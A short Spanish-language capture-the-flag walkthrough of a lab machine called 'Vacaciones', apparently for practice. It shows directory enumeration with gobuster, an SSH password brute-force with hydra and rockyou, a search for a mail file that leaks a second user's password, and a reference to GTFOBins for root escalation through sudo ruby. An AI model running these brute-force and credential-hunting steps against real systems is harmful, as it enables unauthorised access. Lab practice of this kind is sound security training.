# Vacaciones

Con un gobuster
`❯ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 30 -x html,php`

Se encuentra un *javascript* pero no se tiene permisos para acceder

se encuentra un *index.html* con este comentario en F12

```text
De : Juan Para: Camilo , te he dejado un correo es importante...
```


`hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
**password1**

## Escalada

Si ejecutamos `sudo -l` podemos ver que no podemos ejecutar nada como sudoç

Buscamos el correo que se menciona en el comentario
`find / -name "mail" 2>/dev/null`

```text
Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

Accedemos por ssh como *juan@172.17.0.2* y **2k84dicb**
ó
`su juan`

Al hacer `sudo -l` vemos que *(ALL) NOPASSWD: /usr/bin/ruby*
https://gtfobins.github.io/ -> te dice cómo escalar privilegios según binario ejecutable.
